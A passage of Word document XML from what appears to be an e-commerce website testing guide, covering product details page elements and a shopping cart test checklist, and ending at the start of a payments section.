            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Image or images of the product</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="172"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1098" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1099" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Price of the product</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="172"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1100" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1101" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Product specifications</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="172"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1102" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1103" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Reviews</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="172"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1104" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1105" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Check out options</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="172"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1106" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1107" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Delivery options</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="172"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1108" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1109" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Shipping information</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="172"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1110" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1111" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t>In stock/Out of stock</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="172"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1112" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1113" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Multiple color or variations options</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="172"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1114" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1115" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Breadcrumb navigation for the categories (highlighted in Red below). If navigation such as that is displayed, make sure every element of it is functional.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1116" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F97FFE">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="777777"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="43C1C15A" wp14:editId="7B237B06">
            <wp:extent cx="6193155" cy="2626995"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="84" name="Picture 84" descr="Product details Pag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duct details Page">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93155" cy="2626995"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:line="267" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1117" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1118" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="FF6600"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>#4) Shopping Cart:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1119" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F97FFE">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="777777"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1B339383" wp14:editId="24AEC582">
            <wp:extent cx="6193155" cy="1787525"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="83" name="Picture 83" descr="Shopping Cart">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opping Cart">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93155" cy="1787525"/>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120" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1121" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>This is the penultimate stage before the user commits to the purchase.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1122" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1123" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>Test the following:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="173"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1124" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1125" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Add items to the cart and continue shopping</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="173"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1126" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1127" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>If the user adds the same item to the cart while continuing to shop, the item count in the shopping cart should get incremented</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="173"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1128" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1129" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>All items and their totals should be displayed in the cart</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="173"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1130" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1131" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Taxes as per location should be applied</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="173"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1132" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1133" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>A user can add more items to the cart- total should reflect the same</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="173"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1134" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1135" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Update the contents added to the cart- total should reflect that too</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="173"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1136" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1137" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Remove items from the cart</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="173"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1138" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1139" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t>Proceed to checkout</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="173"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1140" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1141" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Calculate Shipping costs with different shipping options</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="173"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1142" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1143" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Apply coupons</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="173"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1144" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1145" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Don’t check out, close the site and come back later. The site should retain the items in the cart</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:line="267" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1146" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1147" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="FF6600"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>#5) Payments:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="369" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1148" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F97FFE">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5FDBD98D" wp14:editId="1035E173">
            <wp:extent cx="5760720" cy="4422140"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="82" name="Picture 82" descr="paymen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yment method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60720" cy="4422140"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="174"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1149" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
